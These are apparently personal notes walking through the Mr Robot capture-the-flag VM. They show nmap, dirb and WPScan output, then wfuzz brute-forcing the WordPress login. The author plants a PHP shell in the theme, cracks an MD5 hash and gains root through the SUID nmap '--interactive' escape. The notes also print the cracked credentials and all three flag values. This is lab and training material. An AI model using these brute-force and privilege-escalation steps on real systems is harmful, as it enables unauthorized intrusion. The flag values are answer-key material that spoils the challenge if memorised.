@@ -1,0 +1,368 @@
+Nmap scan report for 192.168.56.17
+Host is up (0.00066s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+MAC Address: 08:00:27:3F:94:FA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+Network Distance: 1 hop
+
+
+Dirb Result
+
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.56.17/ ----
+==> DIRECTORY: http://192.168.56.17/0/                                                                                                               
+==> DIRECTORY: http://192.168.56.17/admin/                                                                                                           
++ http://192.168.56.17/atom (CODE:301|SIZE:0)                                                                                                        
+==> DIRECTORY: http://192.168.56.17/audio/                                                                                                           
+==> DIRECTORY: http://192.168.56.17/blog/                                                                                                            
+==> DIRECTORY: http://192.168.56.17/css/                                                                                                             
++ http://192.168.56.17/dashboard (CODE:302|SIZE:0)                                                                                                   
++ http://192.168.56.17/favicon.ico (CODE:200|SIZE:0)                                                                                                 
+==> DIRECTORY: http://192.168.56.17/feed/                                                                                                            
+==> DIRECTORY: http://192.168.56.17/image/                                                                                                           
+==> DIRECTORY: http://192.168.56.17/Image/                                                                                                           
+==> DIRECTORY: http://192.168.56.17/images/                                                                                                          
++ http://192.168.56.17/index.html (CODE:200|SIZE:1077)                                                                                               
++ http://192.168.56.17/index.php (CODE:301|SIZE:0)                                                                                                   
++ http://192.168.56.17/intro (CODE:200|SIZE:516314)                                                                                                  
+==> DIRECTORY: http://192.168.56.17/js/                                                                                                              
++ http://192.168.56.17/license (CODE:200|SIZE:309)                                                                                                   
++ http://192.168.56.17/login (CODE:302|SIZE:0)                                                                                                       
++ http://192.168.56.17/page1 (CODE:301|SIZE:0)                                                                                                       
++ http://192.168.56.17/phpmyadmin (CODE:403|SIZE:94)                                                                                                 
++ http://192.168.56.17/rdf (CODE:301|SIZE:0)                                                                                                         
++ http://192.168.56.17/readme (CODE:200|SIZE:64)                                                                                                     
++ http://192.168.56.17/robots (CODE:200|SIZE:41)                                                                                                     
++ http://192.168.56.17/robots.txt (CODE:200|SIZE:41)                                                                                                 
++ http://192.168.56.17/rss (CODE:301|SIZE:0)                                                                                                         
++ http://192.168.56.17/rss2 (CODE:301|SIZE:0)                                                                                                        
++ http://192.168.56.17/sitemap (CODE:200|SIZE:0)                                                                                                     
++ http://192.168.56.17/sitemap.xml (CODE:200|SIZE:0)                                                                                                 
+==> DIRECTORY: http://192.168.56.17/video/                                                                                                           
+==> DIRECTORY: http://192.168.56.17/wp-admin/                                                                                                        
++ http://192.168.56.17/wp-config (CODE:200|SIZE:0)                                                                                                   
+==> DIRECTORY: http://192.168.56.17/wp-content/                                                                                                      
++ http://192.168.56.17/wp-cron (CODE:200|SIZE:0)                                                                                                     
+==> DIRECTORY: http://192.168.56.17/wp-includes/                                                                                                     
++ http://192.168.56.17/wp-links-opml (CODE:200|SIZE:227)                                                                                             
++ http://192.168.56.17/wp-load (CODE:200|SIZE:0)                                                                                                     
++ http://192.168.56.17/wp-login (CODE:200|SIZE:2613)                                                                                                 
++ http://192.168.56.17/wp-mail (CODE:500|SIZE:3064)                                                                                                  
++ http://192.168.56.17/wp-settings (CODE:500|SIZE:0)                                                                                                 
++ http://192.168.56.17/wp-signup (CODE:302|SIZE:0)                                                                                                   
++ http://192.168.56.17/xmlrpc (CODE:405|SIZE:42)                                                                                                     
++ http://192.168.56.17/xmlrpc.php (CODE:405|SIZE:42)                                                                                                 
+                                                                                                                                                     
+---- Entering directory: http://192.168.56.17/0/ ----
++ http://192.168.56.17/0/atom (CODE:301|SIZE:0)                                                                                                      
+==> DIRECTORY: http://192.168.56.17/0/feed/                                                                                                          
++ http://192.168.56.17/0/index.php (CODE:301|SIZE:0)                                                                                                 
++ http://192.168.56.17/0/rdf (CODE:301|SIZE:0)                                                                                                       
++ http://192.168.56.17/0/rss (CODE:301|SIZE:0)                                                                                                       
++ http://192.168.56.17/0/rss2 (CODE:301|SIZE:0)                                                                                                      
+                                                                                                                                                     
+---- Entering directory: http://192.168.56.17/admin/ ----
++ http://192.168.56.17/admin/atom (CODE:301|SIZE:0)                                                                                                  
+==> DIRECTORY: http://192.168.56.17/admin/audio/                                                                                                     
+==> DIRECTORY: http://192.168.56.17/admin/css/                                                                                                       
+==> DIRECTORY: http://192.168.56.17/admin/feed/                                                                                                      
+==> DIRECTORY: http://192.168.56.17/admin/images/                                                                                                    
++ http://192.168.56.17/admin/index (CODE:200|SIZE:1188)                                                                                              
++ http://192.168.56.17/admin/index.html (CODE:200|SIZE:1188)                                                                                         
++ http://192.168.56.17/admin/index.php (CODE:301|SIZE:0)                                                                                             
++ http://192.168.56.17/admin/intro (CODE:200|SIZE:516314)                                                                                            
+==> DIRECTORY: http://192.168.56.17/admin/js/                                                                                                        
++ http://192.168.56.17/admin/rdf (CODE:301|SIZE:0)                                                                                                   
++ http://192.168.56.17/admin/robot (CODE:200|SIZE:30178875)                                                                                          
++ http://192.168.56.17/admin/robots (CODE:200|SIZE:43)                                                                                               
++ http://192.168.56.17/admin/robots.txt (CODE:200|SIZE:43)                                                                                           
++ http://192.168.56.17/admin/rss (CODE:301|SIZE:0)                                                                                                   
++ http://192.168.56.17/admin/rss2 (CODE:301|SIZE:0)                                                                                                  
+==> DIRECTORY: http://192.168.56.17/admin/video/                                                                                                     
+                                                                                                                                                     
+---- Entering directory: http://192.168.56.17/audio/ ----
++ http://192.168.56.17/audio/atom (CODE:301|SIZE:0)                                                                                                  
+==> DIRECTORY: http://192.168.56.17/audio/feed/                                                                                                      
++ http://192.168.56.17/audio/index.php (CODE:301|SIZE:0)                                                                                             
++ http://192.168.56.17/audio/rdf (CODE:301|SIZE:0)                                                                                                   
++ http://192.168.56.17/audio/rss (CODE:301|SIZE:0)                                                                                                   
++ http://192.168.56.17/audio/rss2 (CODE:301|SIZE:0)                                                                                                  
++ http://192.168.56.17/audio/type (CODE:200|SIZE:4643)                                                                                               
+                                                                                                                                                     
+---- Entering directory: http://192.168.56.17/blog/ ----
++ http://192.168.56.17/blog/atom (CODE:301|SIZE:0)                                                                                                   
+==> DIRECTORY: http://192.168.56.17/blog/feed/                                                                                                       
++ http://192.168.56.17/blog/index.php (CODE:301|SIZE:0)                                                                                              
++ http://192.168.56.17/blog/rdf (CODE:301|SIZE:0)                                                                                                    
++ http://192.168.56.17/blog/rss (CODE:301|SIZE:0)                                                                                                    
++ http://192.168.56.17/blog/rss2 (CODE:301|SIZE:0)                                                                                                   
+                                                                                                                                                     
+---- Entering directory: http://192.168.56.17/css/ ----
++ http://192.168.56.17/css/atom (CODE:301|SIZE:0)                                                                                                    
+==> DIRECTORY: http://192.168.56.17/css/feed/                                                                                                        
++ http://192.168.56.17/css/index.php (CODE:301|SIZE:0)                                                                                               
++ http://192.168.56.17/css/rdf (CODE:301|SIZE:0)                                                                                                     
++ http://192.168.56.17/css/rss (CODE:301|SIZE:0)                                                                                                     
++ http://192.168.56.17/css/rss2 (CODE:301|SIZE:0)                                                                                                    
+                                                                                                                                                     
+---- Entering directory: http://192.168.56.17/feed/ ----
+==> DIRECTORY: http://192.168.56.17/feed/atom/                                                                                                       
++ http://192.168.56.17/feed/feed (CODE:301|SIZE:0)       
+
+
+
+a directory found in web with wordlist 
+
+http://192.168.56.17/fsocity.dic
+
+- vp, ap, p -vt, at, t
+
+
+[+] URL: http://192.168.56.17/ [192.168.56.17]
+[+] Started: Fri Oct 23 22:23:31 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://192.168.56.17/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.56.17/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] The external WP-Cron seems to be enabled: http://192.168.56.17/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://192.168.56.17/91bb271.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://192.168.56.17/91bb271.html, Match: 'WordPress 4.3.1'
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://192.168.56.17/wp-content/themes/twentyfifteen/
+ | Latest Version: 2.7
+ | Last Updated: 2020-08-11T00:00:00.000Z
+ | Readme: http://192.168.56.17/wp-content/themes/twentyfifteen/readme.txt
+ | Style URL: http://192.168.56.17/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | The version could not be determined.
+                                                   - vt, at, t
+
+
+first key of 3
+
+key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+
+login post payload
+
+log=§admin§&pwd=§password§&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.17%2Fwp-admin%2F&testcookie=1
+
+the i used wfuzz to brouteforce the wordpress username and password 
+
+To broute the user name 
+......>>>>>>>>>>>>>>>>>>>
+┌─[root@saimson]─[~/Desktop/.machinenote/Mr_robot]
+└──╼ #wfuzz -c -z file,fsocity.dic --hs Invalid -d "log=FUZZ&pwd=a" http://192.168.56.17/wp-login.php 
+
+
+
+┌─[root@saimson]─[~/Desktop/.machinenote/Mr_robot]
+└──╼ #wfuzz -c -z file,fsocity.dic --hs Invalid -d "log=FUZZ&pwd=a" http://192.168.56.17/wp-login.php 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.56.17/wp-login.php
+Total requests: 858160
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                              
+===================================================================
+
+000000015:   200        58 L     194 W    3651 Ch     "Elliot"                                                                             
+000001812:   200        59 L     187 W    3600 Ch     "school"                                                                             ^C
+Finishing pending requests...
+
+
+
+got the user name Elliot
+net is password field to attack
+
+
+
+the i used cat with sort unique to Minimize the size of the wordlist...
+
+cat fsocity.dic | sort --unique >>uniqe.txt
+
+
+
+
+┌─[root@saimson]─[~/Desktop/.machinenote/Mr_robot]
+└──╼ #ls
+fsocity.dic  hash.txt  notes.txt  uniqe.txt
+┌─[root@saimson]─[~/Desktop/.machinenote/Mr_robot]
+└──╼ #wfuzz -c -z file,uniqe.txt --hs ERROR -d "log=Elliot&pwd=FUZZ" http://192.168.56.17/wp-login.php 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.56.17/wp-login.php
+Total requests: 11451
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                              
+===================================================================
+
+000005627:   302        0 L      0 W      0 Ch        "ER28-0652"                                                                          
+
+Total time: 318.3414
+Processed Requests: 11451
+Filtered Requests: 11450
+Requests/sec.: 35.97081
+
+
+now its time to login to wordpress and get the shell
+
+inseted php shell into them footer and get the shell and
+swapped to inractive shell
+
+daemon@linux:/home/robot$ ls
+key-2-of-3.txt	password.raw-md5
+daemon@linux:/home/robot$ cat password.raw-md5 
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$ 
+
+and decryption of the md5 hash is 
+abcdefghijklmnopqrstuvwxyz 
+
+this was password of the user robot 
+then switched to robot to check if he have the permission of super user 
+so i can do some...
+
+
+
+daemon@linux:/$ su robot
+Password: 
+robot@linux:/$ ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ sudo -l
+[sudo] password for robot: 
+Sorry, user robot may not run sudo on linux.
+robot@linux:/$ ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+robot@linux:/$ cd home
+robot@linux:/home$ ls
+robot
+robot@linux:/home$ cd robot/
+robot@linux:~$ ls
+key-2-of-3.txt	password.raw-md5
+robot@linux:~$ ls -lah
+total 16K
+drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
+drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt 
+
+
+822c73956184f694993bede3eb39f959
+let's google
+
+robot@linux:~$ 
+this ia 
+
+got the third key 
+
+ /opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt                         
+073403c8a58a1f80d943455fb30724b9
+
+
+robot@linux:/$ find / -perm -u=s -type f 2>/dev/null            
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:/$ ls -l /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+robot@linux:/$ nmap -V
+
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+robot@linux:/$ nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+# whoami
+root
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+
+
+
+find root of the vm with nmap 
+
+
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+
+boom rooted
+
